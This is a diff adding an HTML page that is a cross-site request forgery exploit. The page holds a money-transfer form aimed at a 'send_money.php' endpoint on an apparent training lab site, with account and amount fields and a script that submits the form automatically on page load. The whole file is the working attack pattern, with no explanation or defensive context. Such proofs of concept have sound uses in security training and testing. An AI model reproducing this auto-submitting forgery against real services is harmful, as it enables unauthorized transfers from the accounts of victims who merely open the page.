@@ -1,0 +1,14 @@
+<!DOCTYPE HTML>  
+<html>
+<body>
+<form action="//labs.hackxpert.com/Testing%20grounds/ComputerSystemsInc/send_money.php" method="POST">
+  <input type="text" name="from_account" id="from_account"/>
+  <input type="text" name="to_account" id="to_account"/>
+  <input type="number" name="amount" id="amount"/>
+  <input type="submit" name="submit" value="Send Money"/> 
+</form>
+</body>
+<script>
+document.forms[0].submit();
+</script>
+</html>
